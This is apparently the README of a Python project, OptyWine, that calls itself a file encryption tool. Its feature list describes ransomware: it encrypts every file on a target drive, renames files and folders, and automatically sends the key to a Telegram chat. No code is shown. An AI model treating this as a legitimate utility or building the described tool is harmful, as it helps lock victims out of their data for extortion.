# 🔒 OptyWine Encryptor & Decryptor

## 📌 About the Project
OptyWine is a Python-based file encryption and decryption tool using the `cryptography` library.  
This script can encrypt your files securely and restore them with a specific decryption key.

---

## ⚙️ Features
- **Strong Encryption:** Uses `Fernet` encryption for secure file protection.  
- **Secure Decryption:** Only valid keys can decrypt the files.  
- **Telegram Key Storage:** The encryption key is automatically sent to a Telegram chat.  
- **File & Folder Renaming:** Encrypted files get a `.optywine` extension, and folders are renamed with `(OptyWine)`.  
- **Automated Processing:** Scans and encrypts/decrypts all files in the target drive.

---

## 🚀 Installation & Usage

### 🔧 Requirements
- Python 3.x
- `cryptography` library
- `requests` library

Install dependencies using:

```sh
pip install cryptography requests
